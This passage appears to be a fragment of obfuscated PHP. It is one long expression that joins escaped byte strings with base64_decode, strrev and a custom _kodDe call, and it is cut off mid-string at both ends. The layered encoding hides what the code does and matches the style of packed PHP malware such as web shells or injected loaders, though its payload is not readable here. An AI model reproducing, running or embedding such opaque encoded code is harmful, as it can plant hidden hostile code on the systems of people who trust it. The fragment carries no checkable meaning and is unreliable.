Åg*ù').base64_decode('FXU1CBBzmmBUR4cyuQEmxWRsM13MQuNmsm41z4G0Zimv51SmM1O1dHYQtCrNU6E=').strrev('U~Lh∞Áõõha∂ï0k%ﬂ0@6%≤´jçÕÅÜñ∞‘Ÿ£0Ó1›í> í')."\116\55\27\241\15\323\246\317\142\170\0\63\127\311\147\113\232\11\7\365\323\31\16\15\250\43\331\74\233\256\212\141\145\127\247\100\320\232\306\132\266\152\144\165\66\63\4"."\xe7\xf7\xf6\xaa\xf4\x68\x91\xe9\xee\x86\x8c\x81\xec\x68\x1e\xce\x25\x67\x37\x43\x97\x2a\xb9\xd5\xab\xd4\x3c\xa4\xb7\xb2\x43\xa3\x19\x3\x66\x6b\xc6\x54\x68\xcb\xcc\x26\xf8\x48\x99\x65\xdd".base64_decode('qIBObxZr1FAqny6wkZ/RBOUOpu1MIb+KdWAmG6qRrJ0x2IxCm2fMhkGZORsgekY=').base64_decode('HRph5hpTGV5Mn8YXApRXMMqVzDCzpRlaPYhENhgQNuuzZ0DufNYaLo0wXJ/OVt4=')."\x54\xa8\x72\xa8\xa4\xea\x83\x79\x10\x4b\xa6\xcf\x6\xc1\xc4\x18\xd5\x86\x8b\xab\x1\xf\xcc\x21\xab\x50\x2c\x81\x59\x68\x6a\x75\x6e\x55\x91\x89\xc9\xd3\xd9\xac\xab\xb9\x81\x4c\x9e\xdd\x57"."\x99\x3e\xd\xa0\x19\x84\x1f\x23\x6c\xe8\x67\xcc\x9c\xce\x70\x17\x2a\x19\x1a\x29\x94\x52\x65\xc0\xa6\xd9\xb3\x21\x93\x51\xca\xd\x16\x32\x6c\xb2\xb\xa8\x6f\x69\xc0\x87\xa1\xfc\xb0\x56\x1a"."\140\12\276\164\241\222\37\0\374\315\347\112\345\125\32\123\75\150\245\374\40\273\242\64\222\323\106\207\127\103\303\246\316\140\15\204\331\262\214\162\52\273\12\72\63\153\16"."\x8c\xd\x5a\x3\xa9\xd5\x43\xc3\x1c\x23\xcd\x91\x22\x34\x67\xc4\xb0\x6c\x73\x35\xb3\x71\xb4\x6\xd3\xa9\x3c\x34\x7f\xe6\x9c\xd9\xc\x23\xa7\xb1\x65\x7\xb5\x35\xb3\x31\x67\x33\x32\x8d\x91"."\304\154\301\32\326\124\146\344\142\227\107\213\51\150\266\155\15\144\315\42\133\133\323\140\300\246\65\303\244\315\234\5\105\216\130\253\213\52\243\177\303\345\101\253\310\260\154"."\x6\x1b\xe5\xa5\x45\xa0\x49\x6d\x6a\x7a\x80\xa9\x40\x91\x58\x6b\x33\x8c\xe6\x9\xf8\x85\x96\x92\xaf\xa8\x96\xb8\x31\x4b\x37\x8c\x5e\x5a\xb6\xa1\x96\x13\xc\x68\x1a\xb3\xdd\x65\x36\xc1\xc2"."\132\302\252\220\133\5\0\327\213\232\320\345\146\122\102\152\306\112\10\311\306\2\7\343\162\316\164\311\226\242\121\310\21\33\267\15\223\133\165\120\173\61\37\156\225\317\331"."\117\66\44\65\316\353\100\67\152\131\303\206\11\303\61\140\144\322\5\243\222\161\224\232\111\71\312\344\120\246\54\160\307\144\307\201\243\162\34\46\261\14\346\30\240\24\231"."\261\244\34\360\261\41\116\111\263\111\225\312\266\152\15\370\144\260\127\216\325\113\250\25\205\202\317\171\7\57\111\376\300\30\320\173\136\226\66\130\321\112\342\10\327\32\220".strrev('m7˘Î`ºŒ«{Ê€e4Ï9–gîq§ân§"å)(P≈‹æQíÖÒ&MÎÎû_')."\xdd\x70\xe3\xd8\x3d\xe7\x6e\xbb\xf1\xa6\xb1\xfb\xcf\x47\xc1\x2d\x77\x6d\x1c\xbb\xf1\x57\xef\xfd\xf2\xe4\x2d\x77\x6d\xd8\x72\xd7\xf1\xdb\x4e\xb9\xed\xa3\xfb\xce\x18\x3b\x73\xf3\xb6\x93\xee"."\37\273\364\272\261\137\237\262\345\336\373\267\75\170\312\273\327\235\276\345\256\115\133\57\75\155\354\344\73\266\334\173\301\330\251\127\214\235\162\346\326\163\67\154\271\377\122"."\x94\x7e\xeb\xa9\xa2\x64\x94\x6c\xc\x9\xd\x28\xef\x7d\x27\x8e\xdd\x75\xd7\xb6\x2b\xaf\xe3\xb1\x1f\xdd\x77\x2\x6d\xc\xdb\x7b\xbb\x34\x1b\xdf\x89\x63\x96\x52\x64\x74\x94\xf9\xa\x20\xa4"."\146\371\224\336\202\206\106\130\41\366\43\330\254\312\316\153\246\142\23\363\52\25\375\55\31\45\57\105\70\172\337\320\122\364\22\216\126\330\334\370\70\122\46\264\142\31\243"."\26\214\222\237\136\101\162\330\131\113\370\127\153\230\151\104\15\264\302\143\55\346\252\1\177\302\231\24\326\271\51\131\25\1\62\55\112\26\145\123\330\315\4\305\66\330\167"."\x71\x94\x4f\xba\x6b\x11\xd4\x9c\x56\xde\xc\x36\xb5\x39\xae\xe8\x16\x5a\x57\x68\x98\x64\x5f\x4f\x8f\x32\xaa\x50\x8a\xac\x2a\x27\x49\x70\xac\x37\x27\x31\x91\xa3\x9c\x23\x1\x6a\x51\x72\xd0"."\xee\x51\x68\x53\x3c\xa\x39\x57\x55\x9c\xf7\xe8\xf0\xc1\x39\x3b\x8c\x96\xd7\x98\xdc\x7c\x53\x2b\x17\xd4\x34\x6f\x7a\x79\xb4\xe6\x20\xca\xad\x91\xf\x75\x5d\x5d\x8b\xd7\x18\x46\xde\x39\x47"."\44\132\327\25\273\106\102\171\264\35\207\234\106\173\1\21\72\161\264\107\216\276\105\67\150\120\250\177\121\105\234\116\232\132\106\147\346\300\132\221\244\144\46\366\104\351\314"."\355\220\323\150\11\230\216\263\243\171\13\312\371\62\276\276\154\317\135\0\327\44\341\114\54\51\325\13\337\342\72\210\14\55\270\317\243\370\202\351\150\223\56\21\343\144\55".base64_decode('Xq9X0t0W+JEN/oLixEEqggXxah4P3sENEdAyz+U0y24hd6OUKQpq6GzfVPRBFsQ=')."\14\337\54\364\111\106\11\26\161\177\111\152\24\375\234\133\261\330\205\206\112\251\300\240\350\23\45\211\125\112\170\336\132\234\75\321\112\31\51\323\134\65\155\267\112\275\311"."\302\120\371\104\57\325\51\42\136\313\34\6\303\55\365\175\30\22\260\274\75\316\331\104\275\362\362\11\106\223\206\66\376\214\105\214\102\141\37\201\42\55\351\362\146\114\340"."\6\316\116\6\341\173\262\332\362\104\226\21\163\121\342\326\240\126\101\145\347\170\26\342\70\364\222\306\261\252\142\361\3\6\154\71\235\104\73\64\333\313\20\6\46\63\72"."\104\206\103\155\311\216\120\114\160\73\354\322\137\240\67\224\214\307\243\222\115\40\271\144\266\44\271\60\332\221\154\217\106\27\206\0\213\140\204\133\44\102\207\257\64\211\43"."\135\34\22\127\233\360\231\206\154\100\45\163\22\370\42\63\336\55\343\12\330\77\42\164\155\357\16\304\270\231\371\14\137\223\157\252\110\213\52\114\142\153\373\126\166\217\62"."\236\10\304\152\134\147\247\327\334\141\364\341\152\73\144\350\216\56\126\332\243\341\276\236\110\234\336\342\246\360\110\124\212\47\306\304\20\315\56\273\127\107\103\361\301\336\160"."\240\75\250\204\42\211\50\273\55\300\315\73\311\75\221\70\17\263\41\60\55\215\137\146\207\374\64\40\337\145\221\113\344\45\1\276\56\363\324\367\327\365\117\356\157\350\157".base64_decode('XOnrt5b7pa1Hl6cHAr0d0L0W/pWxYP31xONHw+WnaCzQHmZNaQvE4TPaHqIf754=').strrev('˚ñÁ|€l†W'."\0".'g≠Êﬁz‹lª∆x‹]Ã'."\r".'8Åﬁ≠ƒ¯Ωm@mßcç…{æ6{ñÛw')."\x1f\x7c\xf7\xbc\xeb\xc6\x6e\xbc\x68\xeb\x5\x77\xbf\x7b\xf1\xcf\x69\xc4\x7b\xd7\xdf\x3c\xb6\xfe\x3a\xde\x30\xe5\xbd\x73\x1f\xd8\xba\xf1\x37\x9c\xe3\xa0\x8c\x86\x7\xe5\x7e\xef\xe4\xd\xef"."\336\177\43\346\67\256\76\176\353\355\247\157\275\164\303\330\372\53\307\176\171\335\273\33\67\217\135\165\322\330\57\66\154\333\174\376\141\156\104\242\341\145\154\52\340\210\337".base64_decode('v6LfmtxAh7ffmoKHthH9NuDLB+iX2VATM9uj+4KR9qD7Mo8cBE8AkymGUKMNYA4=')."\55\360\44\300\302\111\162\111\253\176\334\126\254\205\371\227\32\45\65\246\43\30\157\217\205\332\202\140\336\316\47\152\22\141\217\300\122\0\101\343\261\105\374\233\337\137\253".base64_decode('8tygNDBkblQcHVF9aaNQKZZIY5U6bHxU58FbCLlZpNThLRABtDRaeg34djexTq0=').base64_decode('X1rvafJMbVTArQPNAc4clDqwsub5HJV4Uo7QVE9To1JXHqiDdolxRa1P0pSWono=')."\32\240\301\162\163\105\132\104\52\221\24\252\352\45\333\122\322\36\16\342\371\321\257\303\101\103\332\47\162\320\171\102\51\334\60\45\20\351\160\246\244\176\35\172\353\211\301"."\140\332\107\307\127\236\346\372\106\45\5\227\6\152\104\222\154\216\301\150\165\14\106\303\24\240\23\275\135\174\276\351\215\0\205\136\30\243\315\122\55\66\121\0\45\123\205".base64_decode('oXS2WFoDdQNNDk2PPngMtp3nJSFyxCPYDGI4n8QaccThRh1l4Wg/i1aOkTpw9NA=')."\263\224\367\201\341\262\302\170\11\356\256\3\137\175\13\46\332\273\51\226\307\45\64\317\244\46\71\20\125\14\247\342\100\21\56\7\100\72\272\134\60\101\330\205\244\13\105"."\x3a\xa3\xb1\x1e\x7a\xe5\x2b\xde\xde\x1d\xec\x9\xf8\x80\x88\x53\x4c\xa0\xe9\x31\xa3\xa4\xb4\x2a\xf5\x98\xf2\x51\x50\xbd\x63\xf8\x49\x45\x6c\xc8\x12\xa4\x56\xb4\xae\x92\x36\xe2\x7a\xe8\x28"."\224\163\320\30\230\175\205\134\373\125\111\226\326\172\172\303\36\212\344\176\145\242\261\104\22\15\0\220\147\211\352\326\113\273\205\144\302\214\157\56\15\61\6\76\213\30\36".base64_decode('gzkLyKSYbgcVjstsj0Y6Q+x2WweIx2WmB4FEHbEQvsIN9SusKOlOIQoIuwQUKA8=').base64_decode('Z/i3uMuMI/iejwJiy0cBvtngVJKfHFx/PMK/BaeKAthGTlDfxR38u5tfTcUR0Zg=')."\x14\x8\xc4\x2\x3d\x71\x1e\x8c\x2d\xe6\x97\x26\x38\x8c\x5e\x9e\x48\x46\xfa\x7a\x4\xc5\xf\x7\x16\x21\x64\x89\xa\x6\x85\x51\xeb\x6\xdf\xe4\x5\x8d\xfd\xf4\x2\x1a\xfd\xa4\x3f\x47\xb2".base64_decode('EL6Us3zNVI8yc10jpGFXtpJ2Xi8xphLXcnQ4GY520TDx3xMsZYQwoSxTEIebEBw=')."\256\305\266\56\276\32\24\204\303\12\275\325\252\104\242\213\3\302\45\214\24\1\20\341\41\306\277\142\131\377\160\277\17\61\13\326\112\161\241\254\243\115\141\154\110\73\21".base64_decode('xqnMDrkDbBtd6YEdI1kwcpxRjHQwdoH+LmEfhFZCBiShlgvsZhm90pbsX9t/RL8=').base64_decode('10dv8WHmpd8jmpQMLkF7bDzuuIKYJE5OoHTUS/iiq5YG5sEPiE7zgD2F4PxWPpk=').base64_decode('waPXRtDfrsTaIPobRj/hBJounSdASzIcWhhci/8REY18IOndHWeGUGQt+hcRmLU=')."\xa1\x88\xbb\xb0\xb6\x60\x62\x71\x30\x48\x13\xb0\x6f\xf8\x15\x49\x11\xc1\x81\xae\x4a\xfe\x9d\xb0\x31\x3b\x44\xb\xe3\x76\x28\x3a\x99\x6c\x20\x83\xe9\x5d\x3e\xa5\x31\x99\xf4\x5b\x7d\x80\x2f"."\374\222\177\103\375\341\123\353\141\17\11\304\333\5\365\165\40\104\65\56\20\323\163\47\42\160\257\105\20\356\212\105\373\172\245\160\167\140\121\50\322\305\102\376\311\354\153"."\x32\x14\xad\x74\x84\xe2\x68\x88\xda\x19\x32\xa\x67\x4a\x72\x18\x18\x4e\xc2\x16\xc9\x5c\xaf\x3\xa5\x3b\x10\x65\x47\x1\x89\x65\xc7\xc2\x0\xa5\xcc\xce\x55\xd6\xd6\x17\xa\x77\xc8\xb7\xae"."\x71\x42\xd8\x50\x8\x55\x87\x3d\x65\x12\x6b\x1c\xb\x93\xfb\xd7\x2c\x80\x87\x9c\x7d\x13\x74\x63\x1\x32\x6\x2c\x40\x7\x80\x85\xc8\x70\xb1\x0\x71\xda\xc4\x2\xa4\xa3\x2c\x80\xa5\x93\x60".base64_decode('hMUhYRAJckzCy6tD/Nrg3ExKuuKPabCPqrmwHwgkPapcGenSZBKlkiS3Uxs2Rbo=')."\275\354\247\40\304\155\22\40\372\355\137\271\200\160\303\53\31\142\322\53\262\166\102\267\13\216\132\340\52\35\252\45\104\356\57\112\365\60\273\177\242\302\113\32\222\32\231"."\x6c\xd4\x32\x40\x28\x8d\xa8\xce\x19\xf4\xb3\x42\xf7\x82\x6d\xf7\x88\xe6\x96\x6\x9d\x22\x14\xa7\x4b\x2b\xb9\x64\x4\x6e\x7\x3c\xf0\xb\x2d\xda\x9d\xfe\xf4\x43\x90\xe9\x1c\xe0\x4a\x47\xbd"."\7\66\131\146\377\357\274\43\327\337\137\67\336\150\101\2\66\146\20\254\243\101\226\113\347\173\136\72\217\135\105\44\355\42\323\131\23\341\114\150\207\251\206\131\204\73\142"."\xd1\x5e\xca\x81\x28\xa1\x4e\x85\x3a\x22\x50\xea\xa9\x4e\xba\x1e\x58\xab\xf6\x58\x10\xaf\xe\x9a\x8a\xc5\x35\xd4\x3b\xb4\x49\xf3\xeb\x15\xb8\x95\xdc\xe8\xcc\x15\x8a\x74\x4\x97\x28\xf5\x7a"."\146\44\251\252\111\310\254\240\265\310\12\122\252\112\142\45\320\266\262\163\242\274\61\254\310\350\305\344\345\166\12\113\10\224\253\142\315\210\113\1\166\3\324\3\102\71\217"."\241\34\61\215\12\305\321\206\35\16\223\236\242\50\335\302\214\254\107\341\67\377\61\20\13\37\124\113\11\5\261\10\132\20\215\12\56\111\304\2\30\110\270\317\135\167\101"."\177\10\101\301\322\221\131\44\156\51\222\224\147\363\255\4\45\301\112\7\213\110\231\107\314\44\2\6\221\55\117\352\23\217\41\232\2\72\314\262\36\141\41\160\335\64\324"."\33\13\365\4\142\113\141\310\204\14\0\53\320\50\70\56\307\212\200\156\365\111\327\263\43\250\325\362\165\155\72\307\234\302\42\171\226\121\130\324\32\130\0\170\346\201\341"."\xa1\x3e\xf6\x92\xfc\xf6\x2d\x53\xa2\x34\xb0\x4b\xad\x1e\xf6\xc1\xbc\x20\x90\x5b\x3a\x4c\x25\x55\x44\x24\x87\x87\xc4\xac\x1\xee\xc3\xac\xc8\xb1\xf2\x75\x23\xe1\x4\x10\x6f\x92\x78\x92\x19"."\265\357\14\364\205\145\10\14\225\262\60\270\364\173\326\10\153\151\255\65\302\342\230\72\206\257\66\350\117\303\14\350\37\165\314\320\320\214\144\322\112\311\322\163\45\356\161"."\14\132\5\173\153\137\42\232\104\373\107\54\210\251\71\364\210\17\253\324\136\111\356\226\47\5\212\301\11\270\107\305\357\351\32\113\123\253\153\74\77\327\74\5\43\135\241"."\110\260\265\147\64\24\17\364\50\254\341\240\133\303\276\310\146\103\71\241\150\62\214\170\342\244\254\76\13\105\101\107\353\113\311\136\71\222\302\271\207\117\25\366\314\266\131"."\221\374\334\21\333\146\64\377\1\161\207\237\253\215\111\134\45\205\23\113\273\206\156\264\340\63\1\14\245\334\307\134\206\55\145\166\273\33\374\377\271\15\217\145\260\260\135"._kodDe('MHXUugYIUpl/EZCNMcdiu0x0Nvi4h5mcioqC2Kx0vjZGrVA2BTnMkFgz66C7B+YZ')."\221\156\330\247\235\27\116\7\144\137\174\35\155\154\254\52\45\73\256\25\300\202\240\43\105\254\276\305\355\52\76\160\226\144\15\116\16\54\304\170\123\67\211\256\214\120\122"."\210\167\134\112\45\200\141\341\174\17\237\25\210\62\227\63\31\135\164\162\265\136\166\37\16\224\214\136\315\54\352\344\20\144\261\270\152\302\343\245\334\344\356\216\361\175\203".strrev('∆Fñ£—ÜŸ∆Æa‰q¬kL\'∞2WíRö˛¸®ÖA*ΩÃƒ≤ßzÃ˘z°)[').base64_decode('Il0DNO2ILo6Eo8wHGXM4SEM5sHNAHInpYwGbfZgq1LyYse2Ym5C80h4m4wCZTIE=')."\x93\x81\x58\x7b\x37\x12\xc1\x93\x9d\x21\xb4\x87\xa0\xd\x4a\x14\xd0\x8d\xb2\x22\xe9\x5e\x9a\x26\x9\xda\xc3\x5c\xf5\x20\xfe\x11\x6f\xa2\x61\x23\xc7\x17\x2f\x62\xd1\xc0\x21\x95\x63\x1\x87"."\xa2\x90\xd7\xa7\xe1\xab\x32\xf4\xba\x2\xbe\xce\xc4\x33\x52\x67\x4c\x3f\x9c\xa9\x4f\xf2\xd5\x38\xce\xda\xac\x99\xaf\x1d\x12\xf2\xa\x4d\xa2\x4f\xf9\xe1\xa\x63\x9a\xd8\x16\x51\x36\x72\x33"."\xe9\x7\x33\x9\x77\xa1\xa4\x26\x92\x49\xa2\x5b\xae\x3c\x4\x81\xe8\xbd\xa\x98\xeb\x3c\x44\xb\xdf\x3a\x88\x58\x46\xa2\xc9\x6e\x44\x8f\xa3\x6c\xd7\xd6\xad\x84\x83\xfe\xb1\x5c\xb0\x5a\xc9"."\x1\x8b\x9f\xdc\xd0\x4\x99\x68\x2e\x39\xfd\xa6\x67\x70\x20\x67\xad\x41\x24\x90\x7f\x31\xab\x3\xf0\xfc\x24\x76\xcb\x0\xfd\x59\x5a\xcc\x78\x51\xc3\xc1\x86\x21\xa3\xd9\xdc\xe3\xe\x5e\x65".base64_decode('AckfkHS/tcgJ1LDkAk8d0vBFJKZxqDL+gK5Ud467WHIeuuOToni0L8aOM3CYXHU=')."\x8c\x5\xdb\x97\xf2\x93\x5\xe\xed\xc\x2c\x72\x43\xf0\x1a\x48\x4\xba\x6a\x82\xb9\x72\x8\xc3\x89\x14\x96\x8c\x45\xb1\x16\x2d\x18\xee\x74\x65\x88\x77\x73\x6f\x84\x4e\x58\x32\x1c\x8a\x2c"."\xac\x19\x81\xf6\xf2\x1e\x29\xb\x5\x86\x12\xc1\x1e\x37\xcc\x59\x42\x3c\x88\xd7\xaf\x8\xb7\x85\xa3\xed\x52\x74\x28\x5a\x3d\x12\x9c\x59\xe0\x40\xaa\x83\xa3\x40\xff\x8a\x86\xfe\x35\x44\x8c"."\150\101\322\104\146\55\26\326\275\111\44\353\57\350\137\327\330\320\357\137\340\233\314\165\114\224\236\110\227\42\307\1\133\214\356\267\270\1\170\313\140\100\232\15\102\176\237"."\xf\x2a\xe1\x1f\xfe\x7e\x3f\x77\xf3\xc4\xc8\x28\xb8\x74\x8d\x53\x87\x38\x8e\x56\xb8\xfc\x37\xb0\xab\xd3\x3e\xb7\xc7\xc4\x10\x3d\x72\x4c\xc6\x97\xc6\xf9\x68\x53\x54\xac\x15\xef\xc0\x2f\x9a".base64_decode('TD7CdyVGf3vlpNhqpGZCB4I6rpbKIJ9uiLUgFm3GSFewzx0x4mKbQSCfowhErgc=').base64_decode('hJQLay7O1mYJbTuwI7Yjpq2rO3TUwnBPJNp7dCye6Fu0eMnSY2B0GQpkFS9zmQU=').strrev('5Ë§„©Ïñ/Êñä;_¡¥≈è8¢ßÂb1‹àè®Å√œ2¸≥[ûa{˛bÈ™C˝æ')."\265\224\141\330\343\304\56\352\371\376\202\41\162\131\277\265\234\341\234\77\243\15\371\5\267\302\110\30\227\64\140\277\366\312\176\204\61\172\312\214\127\46\345\332\174\1\40".strrev('oÍcíØ¿=%V<föªÆÈte(⁄a£…M÷π«˝äáatOÈõ—oAìs6'."\0".'¥[H◊|')."\171\207\165\206\115\207\163\361\13\314\204\222\152\232\212\243\222\211\334\240\27\113\43\136\265\220\63\20\277\225\57\62\250\72\340\210\27\276\64\313\106\101\147\126\263\203\136"."\124\205\24\107\23\243\302\331\36\212\315\6\270\37\122\34\260\170\110\136\142\144\227\341\326\54\170\57\353\166\255\150\16\344\136\122\343\244\23\55\312\164\160\13\334\211\30".strrev('Ì"2‹ä¶Ï 8∏ƒg}_-2wtìEa◊Õ¨Æ¶pGÑQË4∏O:ÃF‰*Ês!™È_')."\x60\x4e\x30\x1f\xd0\x29\x99\x57\x9\xfe\x3\x7c\x71\xa3\xb8\xb6\x51\x66\xa3\x4\xd7\x1e\xdb\x46\x63\xd2\xdb\x2\xe\x7f\x4\xb2\x3b\xf3\xc0\xe2\xf8\x74\x6f\x77\x4f\xa0\xdd\x8b\xb6\x94\x66"."\146\273\214\66\366\376\4\332\331\31\142\251\303\326\164\46\157\120\310\224\231\112\36\315\4\140\114\265\317\321\303\235\276\166\51\220\72\321\114\233\132\6\133\214\60\116\222"."\102\135\230\104\201\202\116\320\60\165\316\306\154\252\362\52\157\60\356\6\320\252\32\365\56\251\131\357\222\132\365\56\161\325\273\244\272\136\12\162\141\254\132\56\267\347\61"."\x2e\x38\xa8\xa9\x3\x94\x96\x3\x6c\x27\xcb\x62\xfb\x18\xd9\xae\x6\x34\x9b\xd4\x58\xd6\x87\xa2\x3b\x28\x53\x9d\xe1\xe9\x2d\xf1\xc5\x57\x45\x56\x5a\x2f\x8e\xe2\x7c\x40\xf2\x33\x6c\xe3\xb4"."\30\21\53\250\226\275\310\341\42\347\7\75\343\142\77\16\75\134\14\342\274\253\337\260\54\77\366\13\110\70\166\156\25\26\215\263\263\33\147\237\350\213\30\222\324\15\236"."\312\270\333\126\356\324\125\170\176\245\52\167\372\35\344\256\115\220\340\21\310\141\367\24\210\316\301\250\4\107\312\206\245\311\56\207\63\32\361\123\311\357\201\113\376\171\213"."\352\10\246\104\314\130\116\362\324\313\374\336\312\116\2\361\200\171\213\16\57\342\43\136\324\165\227\257\133\113\323\6\230\200\51\11\41\134\51\320\313\175\330\272\273\203\111"."\201\40\212\46\367\157\114\117\153\275\65\1\136\311\263\2\245\6\222\277\153\324\56\50\32\67\23\326\157\236\214\15\123\44\320\237\143\152\365\332\153\12\247\302\150\56\251"."\xe7\xf9\x85\xda\x28\x73\xd8\xeb\x5a\x1\x2e\x1f\xbf\xfd\x5d\xfd\x3d\xfd\x9\x79\x98\x6c\x53\xcd\x66\x51\xb3\x25\xb7\xa1\x8e\xb6\x8\x97\xc2\x80\x7e\xd8\x8f\x9b\xb0\x29\x1d\xd7\x21\x31\x1c"."\112\34\121\323\237\61\104\22\251\303\217\122\340\173\364\303\111\216\271\344\211\211\32\270\173\64\206\3\366\146\205\225\151\271\42\275\162\42\343\13\336\306\371\313\24\130\251"."\100\335\100\63\222\101\334\63\203\253\367\126\326\43\64\164\245\66\43\3\173\342\232\72\204\211\165\55\165\207\67\240\337\306\72\117\35\146\116\111\30\317\42\6\220\166\324"."\265\34\336\100\76\32\301\321\310\152\270\260\40\171\110\25\47\341\240\116\130\200\206\126\72\276\131\100\106\3\257\375\146\177\263\177\30\350\301\202\101\134\243\170\137\301\275"."\x7\x8c\x24\x11\xd9\x63\xc7\x12\x49\x99\xf8\x2\x59\x87\x51\x97\x63\xba\x79\x4b\x18\x59\xee\xe9\x98\xc1\xa8\x68\xa0\xe7\x18\xaf\xf0\x59\x3c\x6f\xc1\x48\xb1\xa0\x80\xa4\xd9\x5a\x3f\xd5\xd7"."\124\257\260\7\71\132\353\373\22\235\336\331\365\13\346\357\72\257\235\34\346\332\132\17\76\215\305\376\240\251\2\140\76\34\266\314\303\313\213\7\374\316\320\170\171\1\377"."\x8a\xea\x6a\xa3\x84\xb6\x3a\x44\xa1\x8a\xbe\x34\xc\x66\x1f\xa7\x62\xc2\x8d\x74\x49\xb3\x87\xd\x13\x4e\xaa\x81\xc0\x36\x37\xb1\xdb\x53\x12\xed\x29\x5a\x6c\x69\x13\xdf\x6\x2d\x58\x3f\xc9"."\xba\xdf\x57\x1e\xad\x94\xbc\x58\xd\xe1\x8d\xcb\x5e\xe6\x5c\x4e\xea\x9b\x9c\xe9\xb1\x22\xc1\x99\x5e\x26\x8d\x69\x41\x3e\x8a\xe2\x93\x3e\x38\xd0\xa2\xc8\x2f\x4b\x48\x4e\x7a\xbd\x98\x27\xa0".base64_decode('q5LptACGqSYD6bLLY4bXmCQmnSTxSFd78VB7EdOF8R8tKrT92lqtJM6nDtwPILg=')."\107\201\144\301\223\353\225\137\126\30\101\34\67\216\306\176\327\275\170\176\275\172\146\274\30\261\250\153\66\65\15\250\122\53\111\137\105\317\270\253\44\306\1\336\112\205\125".base64_decode('WLNQWR5gCUgnQrw8B2euornmzLibuZf0xtW+zNHiVZqntcyYg/4H8shsGyplZpg=')."\214\76\231\257\363\303\374\131\106\7\304\333\7\254\157\170\302\45\347\360\16\260\30\106\276\302\31\1\161\244\23\255\165\274\252\1\35\245\62\273\344\304\236\50\270\351\112".base64_decode('whY/Sf4oQA1KioQxtmHAtis5AOUTkmMfJk+viiWSKgyInqSwDTZg+ABqqCHYLLI=').strrev('∫èO·˜äÒw5Ë'."\0".'Pµûõ‰ùj+ãö…2’í`iZ¢î0€"ïhRæt‰⁄JÂ')."\x90\x81\x18\xaa\xce\xf7\xe1\xd7\x38\x7c\x78\x93\x8a\x55\x20\x55\x6f\xa1\xc2\x5f\x5b\x28\x93\x6f\x68\x61\x6f\xb8\xaf\x2b\x14\x91\xc\x93\x24\x40\xb2\xbd\x23\x92\xc\xf4\xf6\xd6\x8c\xe0\xc"."\xb\x56\x12\xe2\x53\x7d\xdf\x2a\xf6\x32\x50\x9a\x61\xd5\x3c\xbd\x98\x53\xd2\xf8\x62\x42\x6b\x1d\x86\xd6\x29\x96\x99\x66\x8e\x6e\xeb\xfc\x40\x47\x49\x2\x21\x3f\xcd\xd3\x21\x4b\x3d\xce\xa2"."\x64\x11\x9a\x78\xc9\x17\x8d\xae\x9f\x3f\xcf\xaf\xcf\xe7\x83\x2d\x1c\xf6\x98\x86\xb8\x77\xe1\xf3\x4f\xc4\xd2\x94\x1f\x9b\xfe\x94\x8e\xc0\xb3\x2b\x5b\x22\x10\x68\xa7\x70\xcf\xa3\x28\xf3\x54"."\205\216\143\153\75\266\313\310\326\53\171\264\37\163\273\307\371\356\314\21\166\76\64\317\257\312\221\170\145\305\14\306\376\162\41\152\210\53\352\153\236\100\4\44\267\330\344"."\x75\x84\x76\xb5\xb4\xa8\x3a\xb\x2e\xdc\x97\x96\xa3\xe8\x4c\x92\x9b\x21\xd5\xe9\xfd\x44\x13\xe0\x17\xf2\xa2\xf3\x48\x86\x9f\x62\xd4\x40\xa\x1f\x7f\x63\xa8\xac\xa6\x7\x30\x46\x9\xf2\xf"."\x75\x42\x44\x2f\x16\x51\x68\x84\xc3\xdd\xbf\x2d\x99\x5e\x54\xf0\x2d\x29\xa2\x68\x37\xc5\x9b\x25\x6b\xd6\xd0\x82\xf0\x8e\xbf\x6e\x5d\x35\xc\xac\x37\xdd\x51\x81\xb2\xee\x6\x61\xcc\x71\xc3".base64_decode('sMgtYGgfc1ZDsVZOJCAsDf0VecKRLhGgIokjchkzlCah/mX1vsnr1vl1ZuPE7DE=').base64_decode('WF4fT03D/T5netQTGHqeEADulJR/PAoW367+yeJmF7dlUrCBU2vr/GX8XGc5i2M=')."\114\240\76\165\66\233\376\325\171\157\142\61\377\154\217\10\66\227\154\345\116\377\314\210\305\165\331\236\310\57\30\362\125\101\11\220\217\350\127\2\116\317\266\13\206\370\363".base64_decode('HPKlDvodKJflIHuThhxKFPSUn5MHelDhS4sbVCwJIU4uOLZcckVgN9IEPISoJ2I=')."\xd3\x56\xb9\xe1\xa8\x2c\xe\xe4\x1f\xf3\xac\xb4\xa9\x97\x6d\x7\x61\xa3\xcf\xe7\xd5\x91\xe7\x53\x56\xa9\x43\x2a\x4d\x52\xa7\x80\x40\xdf\x5a\x47\xdc\xc7\xd7\x21\x42\x46\x63\x80\x82\x88\xa6"."\314\303\24\113\61\265\102\153\35\151\256\225\327\64\224\237\320\244\132\225\240\214\165\12\43\247\105\225\217\230\151\33\150\247\344\167\171\340\341\242\276\30\334\211\10\104\340"."\40\10\170\260\211\53\350\357\341\23\371\104\342\127\264\12\232\111\15\277\11\231\42\107\203\131\241\4\203\167\224\172\143\321\104\264\235\75\105\123\113\133\66\235\61\274\26"."\xbd\x7c\x26\x4\x23\x76\x7d\x87\xdb\x47\xb0\x14\x9c\x85\xf0\x3\x4\xa6\xdf\xac\x94\x4a\xdc\xd4\xc\xf3\x94\x7c\x9f\x23\x2\xb4\x96\x81\x45\x43\x8f\xd9\xe2\xf9\x8a\x2d\xf6\x4b\xec\x6b\x3e".base64_decode('gW/VWgCWfO9hz38o8zKquGxtYjcwmHWauIvFUpLDUkLGS7nljqgaxVN9cYIbhmk=')."\45\207\252\204\66\253\140\60\117\205\315\115\115\115\336\246\251\350\177\176\162\14\254\135\113\123\123\125\222\246\246\26\362\77\215\40\332\136\230\13\147\14\242\25\214\310\101"."\202\141\115\203\6\301\16\122\324\113\25\306\175\55\153\307\227\261\24\334\264\345\214\341\140\355\107\323\100\34\10\62\172\63\127\222\31\347\52\344\144\22\102\232\173\20\370".base64_decode('kS9MLNu4Mb1g34gJQqNKBgXay2/soWQCfebSC5KtvFHBUmaZXJmPDS4FCpfGXhY=').base64_decode('4ZXfMIBMdCcR5x2OpqE8Ts+EGIJ29DTvJwZIqhXM0UneFnFQPtYg0fyCHAkV+A0=')."\174\34\214\360\222\350\123\31\324\205\75\214\141\15\114\316\33\303\111\261\151\343\340\121\74\104\206\24\313\126\14\15\63\322\45\106\74\256\214\32\63\264\143\6\13\140\377"."\x40\x2e\xa5\xf\xe8\x5\xc7\x55\xdc\xa4\x54\xb6\x3c\x9a\x73\x71\x42\x79\x94\xd0\x5a\xd\xf0\x37\x41\xa8\x75\x21\xab\x5e\x81\x85\x47\x83\xc4\x79\x31\x79\xba\x8d\x1a\x84\xb6\xec\x5a\x35\x7f"."\xb6\x7b\xee\